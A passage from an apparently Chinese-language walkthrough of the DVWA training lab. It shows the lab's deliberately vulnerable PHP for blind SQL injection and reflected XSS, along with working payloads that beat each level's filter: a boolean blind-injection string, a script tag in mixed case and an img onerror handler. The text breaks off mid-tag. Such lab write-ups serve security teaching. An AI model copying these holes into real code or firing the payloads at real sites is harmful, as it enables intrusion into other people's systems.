punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t\t\t<span class=\"token comment\">// Check database</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t\t\t<span class=\"token variable\">$query</span>  <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"SELECT first_name, last_name FROM users WHERE user_id = <span class=\"token interpolation\"><span class=\"token variable\">$id</span></span>;\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t\t\t<span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t\t\t\t<span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>  <span class=\"token variable\">$query</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// Removed 'or die' to suppress mysql errors</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Exception</span> <span class=\"token variable\">$e</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">print</span> <span class=\"token string double-quoted-string\">\"There was an error.\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">exit</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t\t\t<span class=\"token variable\">$exists</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$result</span> <span class=\"token operator\">!==</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\t\t\t\t\t<span class=\"token variable\">$exists</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token function\">mysqli_num_rows</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$result</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// The '@' character suppresses errors</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\t\t\t\t<span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Exception</span> <span class=\"token variable\">$e</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\t\t\t\t\t<span class=\"token variable\">$exists</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\t\t\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>\t\t\t</pre></td></tr><tr><td data-num=\"30\"></td><td><pre>\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>\t\t<span class=\"token keyword\">case</span> <span class=\"token constant\">SQLITE</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>\t\t\t<span class=\"token keyword\">global</span> <span class=\"token variable\">$sqlite_db_connection</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>\t\t\t</pre></td></tr><tr><td data-num=\"34\"></td><td><pre>\t\t\t<span class=\"token variable\">$query</span>  <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"SELECT first_name, last_name FROM users WHERE user_id = <span class=\"token interpolation\"><span class=\"token variable\">$id</span></span>;\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>\t\t\t<span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>\t\t\t\t<span class=\"token variable\">$results</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$sqlite_db_connection</span><span class=\"token operator\">-></span><span class=\"token function\">query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$query</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>\t\t\t\t<span class=\"token variable\">$row</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$results</span><span class=\"token operator\">-></span><span class=\"token function\">fetchArray</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>\t\t\t\t<span class=\"token variable\">$exists</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$row</span> <span class=\"token operator\">!==</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Exception</span> <span class=\"token variable\">$e</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>\t\t\t\t<span class=\"token variable\">$exists</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$exists</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>\t\t<span class=\"token comment\">// Feedback for end user</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>\t\t<span class=\"token variable\">$html</span> <span class=\"token operator\">.=</span> <span class=\"token string single-quoted-string\">'&lt;pre>User ID exists in the database.&lt;/pre>'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>\t\t<span class=\"token comment\">// Feedback for end user</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>\t\t<span class=\"token variable\">$html</span> <span class=\"token operator\">.=</span> <span class=\"token string single-quoted-string\">'&lt;pre>User ID is MISSING from the database.&lt;/pre>'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre></pre></td></tr><tr><td data-num=\"54\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>可以看到这里又使用了 <code>mysqli_real_escape_string函数</code> ，对特殊字符进行转义</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/web/GB8_%7DHXK%7DVQU7GRZBRR6%28T1.png\" alt=\"\" /></p>\n<p>也限制了我们的输入，使用 burp 抓包来修改（这里是 post 方式）：</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/web/%254M1VSV_%7D%5B_EDETRK%400%60%6058.png\" alt=\"\" /></p>\n<p>可以在这里修改输入的 id，进行 sql 盲注</p>\n<h2 id=\"3等级high-2\"><a class=\"anchor\" href=\"#3等级high-2\">#</a> 3. 等级： <code>high</code></h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"><span>p</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'id'</span> <span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token comment\">// Get input</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token variable\">$id</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'id'</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token variable\">$exists</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token keyword\">switch</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_DVWA</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'SQLI_DB'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t\t<span class=\"token keyword\">case</span> <span class=\"token constant\">MYSQL</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t\t\t<span class=\"token comment\">// Check database</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t\t\t<span class=\"token variable\">$query</span>  <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"SELECT first_name, last_name FROM users WHERE user_id = '<span class=\"token interpolation\"><span class=\"token variable\">$id</span></span>' LIMIT 1;\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t\t\t<span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t\t\t\t<span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>  <span class=\"token variable\">$query</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// Removed 'or die' to suppress mysql errors</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Exception</span> <span class=\"token variable\">$e</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t\t\t\t<span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t\t\t<span class=\"token variable\">$exists</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$result</span> <span class=\"token operator\">!==</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t\t\t\t<span class=\"token comment\">// Get results</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t\t\t\t\t<span class=\"token variable\">$exists</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token function\">mysqli_num_rows</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$result</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// The '@' character suppresses errors</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t\t\t\t<span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Exception</span> <span class=\"token variable\">$e</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\t\t\t\t\t<span class=\"token variable\">$exists</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\t\t\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\t\t\t<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token function\">is_null</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$___mysqli_res</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_close</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token constant boolean\">false</span> <span class=\"token punctuation\">:</span> <span class=\"token variable\">$___mysqli_res</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>\t\t<span class=\"token keyword\">case</span> <span class=\"token constant\">SQLITE</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>\t\t\t<span class=\"token keyword\">global</span> <span class=\"token variable\">$sqlite_db_connection</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>\t\t\t<span class=\"token variable\">$query</span>  <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"SELECT first_name, last_name FROM users WHERE user_id = '<span class=\"token interpolation\"><span class=\"token variable\">$id</span></span>' LIMIT 1;\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>\t\t\t<span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>\t\t\t\t<span class=\"token variable\">$results</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$sqlite_db_connection</span><span class=\"token operator\">-></span><span class=\"token function\">query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$query</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>\t\t\t\t<span class=\"token variable\">$row</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$results</span><span class=\"token operator\">-></span><span class=\"token function\">fetchArray</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>\t\t\t\t<span class=\"token variable\">$exists</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$row</span> <span class=\"token operator\">!==</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Exception</span> <span class=\"token variable\">$e</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>\t\t\t\t<span class=\"token variable\">$exists</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$exists</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>\t\t<span class=\"token comment\">// Feedback for end user</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>\t\t<span class=\"token variable\">$html</span> <span class=\"token operator\">.=</span> <span class=\"token string single-quoted-string\">'&lt;pre>User ID exists in the database.&lt;/pre>'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>\t<span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>\t\t<span class=\"token comment\">// Might sleep a random amount</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>\t\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token function\">rand</span><span class=\"token punctuation\">(</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">3</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>\t\t\t<span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span> <span class=\"token function\">rand</span><span class=\"token punctuation\">(</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>\t\t<span class=\"token comment\">// User wasn't found, so the page wasn't!</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>\t\t<span class=\"token function\">header</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'SERVER_PROTOCOL'</span> <span class=\"token punctuation\">]</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">' 404 Not Found'</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>\t\t<span class=\"token comment\">// Feedback for end user</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>\t\t<span class=\"token variable\">$html</span> <span class=\"token operator\">.=</span> <span class=\"token string single-quoted-string\">'&lt;pre>User ID is MISSING from the database.&lt;/pre>'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre></pre></td></tr><tr><td data-num=\"63\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>这里是利用 cookie 方式传递，并且有个 <code>sleep(rand(2,4))</code>  来干扰时间盲注，这里仍然是利用布尔型盲注</p>\n<p><code>1' and length(database())=4#</code>   得到数据库名长度</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/web/W%28YF162%40NXQC%40J9EZ%28UEJ8K.png\" alt=\"\" /></p>\n<p>后续方式和等级 <code>low</code>  类似</p>\n<h1 id=\"4xssreflected\"><a class=\"anchor\" href=\"#4xssreflected\">#</a> 4.XSS(Reflected)</h1>\n<h2 id=\"1等级-low\"><a class=\"anchor\" href=\"#1等级-low\">#</a> 1. 等级:  <code>low</code></h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"><span>p</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">header</span> <span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"X-XSS-Protection: 0\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">// Is there any input?</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token function\">array_key_exists</span><span class=\"token punctuation\">(</span> <span class=\"token string double-quoted-string\">\"name\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_GET</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'name'</span> <span class=\"token punctuation\">]</span> <span class=\"token operator\">!=</span> <span class=\"token constant\">NULL</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token comment\">// Feedback for end user</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token variable\">$html</span> <span class=\"token operator\">.=</span> <span class=\"token string single-quoted-string\">'&lt;pre>Hello '</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'name'</span> <span class=\"token punctuation\">]</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'&lt;/pre>'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/web/1%24LQ38Q2M%288SW%5DEKMNSDDT3.png\" alt=\"\" /></p>\n<p>源码通过 get 方式获得 name，没有进行过滤，输入 js 脚本即可执行</p>\n<p><code>&lt;script&gt;alert(123)&lt;/script&gt;</code></p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/web/IJM%5B%7DBR0UM6%7D%29R%5DVS8DU0AK.png\" alt=\"\" /></p>\n<h2 id=\"2等级medium-4\"><a class=\"anchor\" href=\"#2等级medium-4\">#</a> 2. 等级： <code>Medium</code></h2>\n<pre><code>&lt;?php\n\nheader (&quot;X-XSS-Protection: 0&quot;);\n\n// Is there any input?\nif( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) &#123;\n   // Get input\n   $name = str_replace( '&lt;script&gt;', '', $_GET[ 'name' ] );\n\n   // Feedback for end user\n   $html .= &quot;&lt;pre&gt;Hello &#123;$name&#125;&lt;/pre&gt;&quot;;\n&#125;\n\n?&gt;\n</code></pre>\n<p>这里 <code>str_replace( '&lt;script&gt;', '', $_GET[ 'name' ] );</code>  进行了过滤，将 <code>&lt;script&gt;</code>  过滤掉了，不过没有限制大小写，这里直接大写 <code>&lt;Script&gt;</code>  就能绕过</p>\n<p><code>&lt;Script&gt;alert(321)&lt;/script&gt;</code></p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/web/I%7BNLLMGX1OYY%5BY%5BZ8%7EBLCGE.png\" alt=\"\" /></p>\n<h2 id=\"3等级high-3\"><a class=\"anchor\" href=\"#3等级high-3\">#</a> 3. 等级： <code>High</code></h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"><span>p</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">header</span> <span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"X-XSS-Protection: 0\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">// Is there any input?</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token function\">array_key_exists</span><span class=\"token punctuation\">(</span> <span class=\"token string double-quoted-string\">\"name\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_GET</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'name'</span> <span class=\"token punctuation\">]</span> <span class=\"token operator\">!=</span> <span class=\"token constant\">NULL</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token comment\">// Get input</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token variable\">$name</span> <span class=\"token operator\">=</span> <span class=\"token function\">preg_replace</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">'/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'name'</span> <span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t<span class=\"token comment\">// Feedback for end user</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t<span class=\"token variable\">$html</span> <span class=\"token operator\">.=</span> <span class=\"token string double-quoted-string\">\"&lt;pre>Hello <span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$name</span><span class=\"token punctuation\">&#125;</span></span>&lt;/pre>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>这里 <code>preg_replace( '/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] )</code>  利用了正则过滤，防止了 <code>&lt;script&gt;</code> ，这里可以利用 img，body 标签的 src 来输入 js 代码</p>\n<p><code>&lt;img src=1 onerror=alert(111)&gt;</code></p>\n<p><img 